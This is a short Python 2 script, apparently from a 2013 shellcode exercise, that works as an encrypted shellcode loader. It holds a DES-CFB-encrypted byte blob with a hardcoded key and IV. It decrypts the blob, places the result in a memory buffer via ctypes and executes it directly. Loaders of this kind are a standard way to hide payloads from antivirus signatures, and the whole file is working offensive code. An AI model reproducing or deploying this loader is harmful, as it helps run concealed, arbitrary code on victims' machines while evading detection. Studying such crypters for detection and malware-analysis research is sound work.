#!/usr/bin/python
# Filename : DES_Decrypter_shellcode.py
# Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
# Date : 2013 August
# Location : Lima(Peru)
# Desc : Python Custom Decrypter DES Cipher feedback (CFB) 
# Tested on : Linux/x86 (Kali Linux SMP 3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686)
from Crypto.Cipher import DES
from ctypes import *

#Insert encrypted shellcode
encrypted_shellcode="\x32\xc8\x25\x99\x84\x0b\x46\x24\x2d\xfd\x47\x40\x30\x93\x0f\x0c\xe0\xe6\x26\x58\xe9\x21\x5b\x62\xb3\x01\xaf\x01\xf2\x9c\x86\xb1\xf7\x11\xf5\x21\x62\xd4\x28\x1f\x9f\x1a\xab\x9f\x72\x06\xbc\xb6"

decrypt_shellcode=""

#Insert secret key
secret_key = "abcdefgh"

#Insert IV
iv = "\x8e\xe7\xa8\xde\xe3\xe1\xd1\xda"

def to_hex(shellcode):
        shellhex=""
        for x in bytearray(shellcode) :
                shellhex += '\\x'
                shellhex += '%02x' % (x & 0xff)
        return shellhex

print " [*] Decrypting Shellcode ..."
des = DES.new(secret_key, DES.MODE_CFB, iv)
decrypt_shellcode=des.decrypt(encrypted_shellcode)
print " [*] Executing Shellcode ..."
memorywithshell = create_string_buffer(decrypt_shellcode, len(decrypt_shellcode))
shell = cast(memorywithshell,CFUNCTYPE(c_void_p))
shell()
